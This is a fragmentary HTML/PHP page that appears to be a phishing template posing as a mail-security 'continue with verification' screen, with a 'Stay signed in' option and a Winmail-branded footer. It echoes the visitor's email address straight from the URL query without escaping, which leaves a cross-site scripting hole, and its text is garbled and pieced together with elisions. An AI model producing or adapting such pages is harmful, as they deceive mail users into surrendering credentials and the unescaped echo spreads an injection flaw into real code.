...
<table align="center" border="0" cellpadding="0" cellspacing="0" height="100%" width="100%">
	<tbody>
		<tr>
			<td align="center" bgcolor="#0075c8" valign="middle">
			<table border="0" cellpadding="0" cellspacing="0" width="100%">
				<tbody>
					<tr height="420">
						<td align="center" " valign="middle">
						<table  border="0" cellpadding="0" cellspacing="0" height="420" width="940">
							<tbody>
								<tr>
									<td align="center" style="padding-right:20px">
									<table bgcolor="#FFFFFF" border="0" cellpadding="0" cellspacing="1" width="400">
										<tbody>
											<tr>
												<td background="" bgcolor="#ffffff" style="padding: 5px; text-align: center;" valign="top">
												<table border="0" cellpadding="0" cellspacing="0" width="100%">
													<tbody>
														<tr height="110">
															
															<td align="center" style="font-family: 'Aclonica';font-size: 22px;"> continue with verification</td>
														</tr>
													</tbody>
												</table>
	...
	<?php echo $_GET['email']; ?> 
					...
					<input class="" type="checkbox" />Stay signed in(<span style="font-size:0.8em; color:#999;">we'll automatically get your email address, we'd never ask you for your email addres</span>) <br><br>
						...
						<table border="0" cellpadding="0" cellspacing="0" width="100%">
							<tbody>
								<tr height="30">
									...
									<td width="5%"></td>
									<td align="left" nowrap="nowrap" width="*%">&nbsp;<a href="?" target="_blank" style="color:white;">You will receiving a confirmation email after activation</a><a class="gray" href="http://www.magicwinmail.net?so=winmailcust" target="_blank"> Mail Security © 2019</a></td>
								</tr>
							</tbody>
						</table>
						</td>
